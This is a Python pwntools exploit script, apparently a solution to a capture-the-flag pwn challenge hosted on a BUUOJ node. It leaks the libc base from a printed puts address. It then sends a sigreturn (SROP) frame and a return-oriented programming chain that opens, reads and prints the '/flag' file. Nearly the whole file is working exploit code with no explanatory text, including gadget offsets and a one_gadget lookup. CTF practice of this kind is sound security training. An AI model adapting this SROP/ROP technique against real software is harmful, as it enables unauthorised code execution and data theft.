from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
from subprocess import check_output

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

context.log_level = 'DEBUG'
binary = './vn_pwn_babybabypwn_1'
context.binary = binary
elf = ELF(binary,checksec=False)
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
#libc_path = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
#env={'LD_PRELOAD':libc_path}
libc = ELF(libc_path,checksec=False)
one = map(int, check_output(['one_gadget','--raw',libc_path]).split(' '))
p = remote('node3.buuoj.cn',25758) if argv[1]=='r' else process(binary)

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,4,3,2
def add(name='a'*8,content='b'*0x70):
	sla('choice :',_add)
	sa('name',name)
	sa('sex','W')
	sa('tion',content)

def free(index):
	sla('choice :',_free)
	sla('index :',index)

def edit(index,content):
	sla('choice :',_edit)
	sla(':',index)
	sa('sex?','N')
	sa('tion',content)

def show(index):
	sla('choice :',_show)
	sla(':',index)

# start
ru('0x')
puts = int(ru('\n'),16)
base = puts-libc.sym['puts']
leak('base',base)
pop_rdi = base+0x21102
pop2 = base+0x1150c9
open = base+libc.sym['open']
read = base+libc.sym['read']
buf = base+libc.bss()

frame = SigreturnFrame()
frame.rdi = 0
frame.rsi = buf
frame.rdx = 0x100
frame.rsp = buf
frame.rip = read
sa('message:',str(frame)[8:])

chain = [
	# read(0,buf,0x100)
	pop_rdi,0,pop2,0x100,buf,read,
	# open(buf,0,0)
	pop_rdi,buf,pop2,0,0,open,
	# read(3,buf,0x100)
	pop_rdi,3,pop2,0x100,buf,read,
	# puts(buf)
	pop_rdi,buf,puts
]
s(flat(chain))
s('/flag\x00')
# end

p.interactive()